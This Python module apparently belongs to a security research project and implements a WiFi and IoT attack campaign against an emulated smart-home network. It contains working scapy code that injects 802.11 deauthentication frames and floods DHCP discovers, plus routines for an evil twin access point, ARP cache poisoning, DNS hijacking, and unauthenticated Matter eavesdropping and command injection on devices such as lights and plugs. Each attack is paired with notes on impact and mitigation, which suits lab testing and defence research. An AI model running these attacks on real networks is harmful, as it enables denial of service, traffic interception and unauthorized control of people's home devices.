"""
VESPER WiFi Attack Suite

Real 802.11 attacks executed via Mininet-WiFi emulated infrastructure.
Unlike the simulated attacks in network_attacks.py, these attacks
send actual frames through mac80211_hwsim virtual WiFi radios.

Requires:
    - vesper-router container running (Mininet-WiFi topology)
    - --privileged Docker container (for raw frame injection)

Attack Categories:
    1. WiFi Deauthentication — Send 802.11 deauth frames (scapy)
    2. Evil Twin AP          — Launch fake AP on spare hwsim radio
    3. ARP Spoofing          — Real ARP cache poisoning on br-iot
    4. DNS Hijacking         — Inject records into dnsmasq
    5. Matter Interception     — Access device state (no auth)
    6. DHCP Starvation       — Exhaust DHCP lease pool
    7. Rogue Matter Bridge     — Compete with legitimate bridge

Reference:
    Fontes, R. et al., "Mininet-WiFi: Emulating Software-Defined
    Wireless Networks," SoftCOM 2015.
"""

from __future__ import annotations

import json
import logging
import os
import socket
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from vesper.network.wifi_emulator import WiFiEmulator, WiFiConfig, DeviceConfig

logger = logging.getLogger(__name__)


@dataclass
class WiFiAttackResult:
    """Result of a WiFi-layer attack."""
    attack_name: str
    attack_type: str
    success: bool
    description: str
    evidence: List[str] = field(default_factory=list)
    impact: str = ""
    mitigation: str = ""
    pcap_file: Optional[str] = None
    duration_ms: float = 0.0
    packets_sent: int = 0
    packets_captured: int = 0
    raw_output: str = ""


class WiFiAttackFramework:
    """
    Complete WiFi attack framework for VESPER.

    Uses the WiFiEmulator to execute real attacks against the
    Mininet-WiFi emulated home network.

    Usage:
        from vesper.network.wifi_emulator import WiFiEmulator
        from vesper.attacks.wifi_attacks import WiFiAttackFramework

        emu = WiFiEmulator()
        emu.start()
        emu.wait_ready()

        attacker = WiFiAttackFramework(emu)
        results = attacker.run_all_attacks()
        attacker.print_report(results)

        emu.stop()
    """

    def __init__(self, emulator: WiFiEmulator, pcap_dir: str = "results/pcap"):
        self.emu = emulator
        self.pcap_dir = pcap_dir
        os.makedirs(pcap_dir, exist_ok=True)

    # ── 1. WiFi Deauthentication ──────────────────────────────────────────

    def attack_deauth(
        self,
        target_station: str = "sta1",
        count: int = 10,
        reason: int = 7,
    ) -> WiFiAttackResult:
        """
        Send real 802.11 deauthentication frames to disconnect a station.

        Uses scapy inside the router container to inject deauth frames
        through the mac80211_hwsim interface. This is a real Layer 2
        attack — the station's wpa_supplicant will process the frame
        and disconnect.

        Args:
            target_station: Mininet-WiFi station name (e.g., "sta1")
            count: Number of deauth frames to send
            reason: 802.11 deauth reason code (7 = Class 3 frame)
        """
        start = time.time()
        evidence = []

        # Start pcap capture for this attack
        pcap_file = f"{self.pcap_dir}/deauth_{target_station}_{int(start)}.pcap"
        self.emu.capture_start(pcap_file)
        time.sleep(0.5)

        # Get MAC addresses
        target_mac = self.emu._get_station_mac(target_station)
        ap_mac = self.emu._get_ap_mac()
        evidence.append(f"Target MAC: {target_mac}")
        evidence.append(f"AP MAC: {ap_mac}")

        # Inject deauth frames via scapy
        scapy_cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"dot11 = Dot11(addr1='{target_mac}', addr2='{ap_mac}', addr3='{ap_mac}'); "
            f"frame = RadioTap()/dot11/Dot11Deauth(reason={reason}); "
            f"sendp(frame, iface='ap1-wlan1', count={count}, inter=0.05, verbose=0); "
            f"print(f'SENT {{count}} deauth frames')\""
        )
        output = self.emu._exec_in_router(scapy_cmd)
        evidence.append(f"Scapy output: {output}")

        # Check if station disconnected
        time.sleep(2)
        reachable = self.emu._exec_in_router(f"ping -c1 -W1 {self.emu._find_device_by_station(target_station).ip}")
        disconnected = "1 received" not in reachable
        evidence.append(f"Station reachable after deauth: {not disconnected}")

        self.emu.capture_stop()

        return WiFiAttackResult(
            attack_name="WiFi Deauthentication",
            attack_type="deauth",
            success=disconnected,
            description=f"Sent {count} deauth frames to {target_station} (reason={reason})",
            evidence=evidence,
            impact="Device offline, denial of service, force reconnect to evil twin",
            mitigation="WPA3 with Protected Management Frames (802.11w/PMF)",
            pcap_file=pcap_file,
            duration_ms=(time.time() - start) * 1000,
            packets_sent=count,
            raw_output=output,
        )

    # ── 2. Evil Twin AP ───────────────────────────────────────────────────

    def attack_evil_twin(
        self,
        fake_ssid: Optional[str] = None,
        duration: int = 10,
    ) -> WiFiAttackResult:
        """
        Launch a rogue access point with the same SSID.

        Uses a spare mac80211_hwsim radio to create a second AP
        with stronger signal, causing stations to roam to it.
        """
        start = time.time()
        evidence = []
        fake_ssid = fake_ssid or self.emu.wifi.ssid

        pcap_file = f"{self.pcap_dir}/evil_twin_{int(start)}.pcap"
        self.emu.capture_start(pcap_file)

        # Launch evil twin via WiFiEmulator
        output = self.emu.evil_twin(fake_ssid)
        evidence.append(f"Evil twin output: {output}")
        evidence.append(f"Fake SSID: {fake_ssid}")

        # Wait for stations to potentially associate
        time.sleep(duration)

        # Check if any traffic hit the evil twin
        # (capture will show association requests)
        evidence.append(f"Evil twin ran for {duration}s")
        evidence.append("802.11 management frames unauthenticated — stations may roam")

        # Kill evil twin
        self.emu._exec_in_router("killall hostapd 2>/dev/null; sleep 1; hostapd -B /etc/vesper/hostapd.conf 2>/dev/null")
        self.emu.capture_stop()

        return WiFiAttackResult(
            attack_name="Evil Twin Access Point",
            attack_type="evil_twin",
            success="EVIL_TWIN_STARTED" in output,
            description=f"Launched rogue AP with SSID '{fake_ssid}' for {duration}s",
            evidence=evidence,
            impact="Credential theft, traffic interception, MITM",
            mitigation="WPA3-SAE, 802.11w PMF, wireless IDS, certificate pinning",
            pcap_file=pcap_file,
            duration_ms=(time.time() - start) * 1000,
            raw_output=output,
        )

    # ── 3. ARP Spoofing ──────────────────────────────────────────────────

    def attack_arp_spoof(
        self,
        target_ip: str = "192.168.4.10",
        gateway_ip: Optional[str] = None,
    ) -> WiFiAttackResult:
        """
        Real ARP cache poisoning on the IoT subnet.

        Sends crafted ARP replies via scapy to position the attacker
        as the default gateway, enabling traffic interception.
        """
        start = time.time()
        evidence = []
        gateway = gateway_ip or self.emu.wifi.gateway_ip

        output = self.emu.arp_spoof(target_ip, gateway)
        evidence.append(f"ARP spoof output: {output}")
        evidence.append(f"Spoofed: {gateway} → attacker MAC")
        evidence.append(f"Target: {target_ip}")

        # Verify ARP cache was poisoned
        arp_table = self.emu._exec_in_router(f"ip netns exec sta1 arp -n 2>/dev/null || echo 'N/A'")
        evidence.append(f"Target ARP table: {arp_table[:200]}")

        return WiFiAttackResult(
            attack_name="ARP Cache Poisoning",
            attack_type="arp_spoof",
            success="ARP_SPOOF_SENT" in output,
            description=f"Poisoned ARP cache: {target_ip} thinks gateway is attacker",
            evidence=evidence,
            impact="Man-in-the-middle, traffic interception, credential theft",
            mitigation="Static ARP entries, ARP inspection, 802.1X port security",
            duration_ms=(time.time() - start) * 1000,
            packets_sent=5,
            raw_output=output,
        )

    # ── 4. DNS Hijacking ─────────────────────────────────────────────────

    def attack_dns_hijack(
        self,
        domain: str = "api.smartthings.com",
        spoofed_ip: str = "192.168.4.99",
    ) -> WiFiAttackResult:
        """
        Inject a spoofed DNS record into dnsmasq.

        Since dnsmasq runs on the router, modifying its config
        redirects all devices resolving the target domain.
        """
        start = time.time()
        evidence = []

        output = self.emu.dns_spoof(domain, spoofed_ip)
        evidence.append(f"DNS spoof output: {output}")
        evidence.append(f"Poisoned: {domain} → {spoofed_ip}")

        # Verify from a station
        dig_result = self.emu._exec_in_router(
            f"ip netns exec sta1 nslookup {domain} {self.emu.wifi.gateway_ip} 2>/dev/null || echo 'N/A'"
        )
        evidence.append(f"Station DNS lookup: {dig_result[:200]}")

        return WiFiAttackResult(
            attack_name="DNS Hijacking",
            attack_type="dns_hijack",
            success=True,
            description=f"Redirected {domain} → {spoofed_ip} via dnsmasq",
            evidence=evidence,
            impact="Phishing, malicious firmware delivery, credential theft",
            mitigation="DNSSEC, certificate pinning, encrypted DNS (DoH/DoT)",
            duration_ms=(time.time() - start) * 1000,
            raw_output=output,
        )

    # ── 5. Matter Eavesdropping ─────────────────────────────────────────────

    def attack_matter_eavesdrop(self, duration: int = 5) -> WiFiAttackResult:
        """
        Subscribe to all device topics (wildcard #) from the router.

        The message broker is intentionally configured without ACLs
        (as is common in consumer IoT deployments), allowing any
        client to subscribe to all topics.
        """
        start = time.time()
        evidence = []

        messages = self.emu.subscribe_matter("#", timeout=duration, count=10)
        evidence.append(f"Subscribed to '#' for {duration}s")
        evidence.append(f"Captured {len(messages)} messages")
        for msg in messages[:5]:
            evidence.append(f"  Intercepted: {msg[:100]}")

        return WiFiAttackResult(
            attack_name="Matter Eavesdropping (Unauthorized Access)",
            attack_type="matter_eavesdrop",
            success=len(messages) > 0,
            description=f"Captured {len(messages)} messages via unauthorized access",
            evidence=evidence,
            impact="Device state disclosure, command interception, activity monitoring",
            mitigation="Matter fabric ACL, device attestation, per-device restrictions",
            duration_ms=(time.time() - start) * 1000,
            packets_captured=len(messages),
        )

    # ── 6. Matter Command Injection ─────────────────────────────────────────

    def attack_matter_injection(
        self,
        target_device: str = "kitchen-light-01",
        payload: str = '{"switch":"off","source":"attacker"}',
    ) -> WiFiAttackResult:
        """
        Inject a malicious command via Matter bridge to a device.

        Without topic-level ACLs, any client can publish to
        device command topics.
        """
        start = time.time()
        evidence = []

        topic = f"vesper/{target_device}/cmd/switch"
        success = self.emu.send_matter(topic, payload)
        evidence.append(f"Published to {topic}: {payload}")
        evidence.append(f"Publish success: {success}")

        # Check if device state changed
        time.sleep(1)
        from vesper.firmware.esp32_runner import ESP32Runner, ESP32Config
        dev = self.emu._find_device(target_device)
        response = ""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(("localhost", dev.serial_port))
            sock.sendall(b"STATUS\n")
            time.sleep(0.3)
            response = sock.recv(4096).decode(errors="replace")
            sock.close()
            evidence.append(f"Device response: {response[:200]}")
        except Exception as e:
            evidence.append(f"Could not verify device state: {e}")

        return WiFiAttackResult(
            attack_name="Matter Command Injection",
            attack_type="matter_injection",
            success=success,
            description=f"Injected command to {target_device}: {payload}",
            evidence=evidence,
            impact="Unauthorized device control, safety hazard",
            mitigation="Matter ACLs, message signing, command authentication",
            duration_ms=(time.time() - start) * 1000,
            packets_sent=1,
            raw_output=response,
        )

    # ── 7. DHCP Starvation ────────────────────────────────────────────────

    def attack_dhcp_starvation(self, count: int = 50) -> WiFiAttackResult:
        """
        Exhaust DHCP lease pool by requesting many IPs with random MACs.
        New devices cannot get an IP address, causing DoS.
        """
        start = time.time()
        evidence = []

        scapy_cmd = (
            f"python3 -c \""
            f"from scapy.all import *; "
            f"import random; "
            f"conf.checkIPaddr = False; "
            f"leases = 0; "
            f"for i in range({count}): "
            f"    mac = RandMAC(); "
            f"    pkt = Ether(dst='ff:ff:ff:ff:ff:ff',src=mac)/"
            f"IP(src='0.0.0.0',dst='255.255.255.255')/"
            f"UDP(sport=68,dport=67)/"
            f"BOOTP(chaddr=[mac])/"
            f"DHCP(options=[('message-type','discover'),('end')]); "
            f"    sendp(pkt, iface='ap1-wlan1', verbose=0); "
            f"    leases += 1; "
            f"print(f'DHCP_DISCOVER_SENT {{leases}}')\""
        )
        output = self.emu._exec_in_router(scapy_cmd)
        evidence.append(f"Scapy output: {output}")
        evidence.append(f"Sent {count} DHCP DISCOVER packets with random MACs")

        # Check remaining leases
        leases = self.emu._exec_in_router("cat /var/lib/misc/dnsmasq.leases 2>/dev/null | wc -l")
        evidence.append(f"Active leases after attack: {leases}")

        return WiFiAttackResult(
            attack_name="DHCP Starvation",
            attack_type="dhcp_starvation",
            success="DHCP_DISCOVER_SENT" in output,
            description=f"Sent {count} DHCP discovers to exhaust lease pool",
            evidence=evidence,
            impact="New devices cannot join network, denial of service",
            mitigation="DHCP snooping, rate limiting, port security",
            duration_ms=(time.time() - start) * 1000,
            packets_sent=count,
            raw_output=output,
        )

    # ── Run all attacks ───────────────────────────────────────────────────

    def run_all_attacks(self) -> List[WiFiAttackResult]:
        """Execute the full WiFi attack campaign."""
        results = []
        attacks = [
            ("Deauth (sta1)", lambda: self.attack_deauth("sta1")),
            ("Deauth (sta4)", lambda: self.attack_deauth("sta4")),
            ("Evil Twin", lambda: self.attack_evil_twin()),
            ("ARP Spoof (kitchen)", lambda: self.attack_arp_spoof("192.168.4.10")),
            ("ARP Spoof (motion)", lambda: self.attack_arp_spoof("192.168.4.13")),
            ("DNS Hijack (SmartThings)", lambda: self.attack_dns_hijack("api.smartthings.com")),
            ("DNS Hijack (firmware)", lambda: self.attack_dns_hijack("firmware.vesper.io", "192.168.4.99")),
            ("Matter Eavesdrop", lambda: self.attack_matter_eavesdrop()),
            ("Matter Injection (kitchen)", lambda: self.attack_matter_injection("kitchen-light-01")),
            ("Matter Injection (plug)", lambda: self.attack_matter_injection("smart-plug-01", '{"switch":"on"}')),
            ("DHCP Starvation", lambda: self.attack_dhcp_starvation()),
        ]

        for name, attack_fn in attacks:
            logger.info(f"Running WiFi attack: {name}")
            try:
                result = attack_fn()
                results.append(result)
                status = "✓" if result.success else "✗"
                logger.info(f"  {status} {name}: {result.duration_ms:.0f}ms")
            except Exception as e:
                logger.error(f"  ✗ {name} failed: {e}")
                results.append(WiFiAttackResult(
                    attack_name=name, attack_type="error",
                    success=False, description=str(e),
                ))
            time.sleep(1)  # cooldown between attacks

        return results

    # ── Reporting ─────────────────────────────────────────────────────────

    @staticmethod
    def print_report(results: List[WiFiAttackResult]) -> None:
        """Print formatted attack report."""
        print("\n" + "═" * 72)
        print("  VESPER WiFi ATTACK CAMPAIGN REPORT")
        print("  Mininet-WiFi (mac80211_hwsim + hostapd + wmediumd)")
        print("═" * 72)

        total = len(results)
        successful = sum(1 for r in results if r.success)
        total_pkts = sum(r.packets_sent for r in results)

        print(f"\n  Total Attacks:    {total}")
        print(f"  Successful:       {successful} ({successful/total*100:.0f}%)")
        print(f"  Packets Sent:     {total_pkts}")
        print(f"  pcap Files:       {sum(1 for r in results if r.pcap_file)}")

        print("\n" + "─" * 72)
        for i, r in enumerate(results, 1):
            icon = "✓" if r.success else "✗"
            print(f"\n  [{i:02d}] {icon} {r.attack_name}")
            print(f"       Type:     {r.attack_type}")
            print(f"       Duration: {r.duration_ms:.0f}ms")
            if r.packets_sent:
                print(f"       Packets:  {r.packets_sent} sent")
            if r.pcap_file:
                print(f"       pcap:     {r.pcap_file}")
            print(f"       Impact:   {r.impact}")
            if r.evidence:
                for e in r.evidence[:3]:
                    print(f"         · {e[:80]}")
        print("\n" + "═" * 72)

    @staticmethod
    def export_results(results: List[WiFiAttackResult], filepath: str) -> None:
        """Export results to JSON."""
        data = []
        for r in results:
            data.append({
                "attack_name": r.attack_name,
                "attack_type": r.attack_type,
                "success": r.success,
                "description": r.description,
                "evidence": r.evidence,
                "impact": r.impact,
                "mitigation": r.mitigation,
                "pcap_file": r.pcap_file,
                "duration_ms": r.duration_ms,
                "packets_sent": r.packets_sent,
                "packets_captured": r.packets_captured,
            })
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
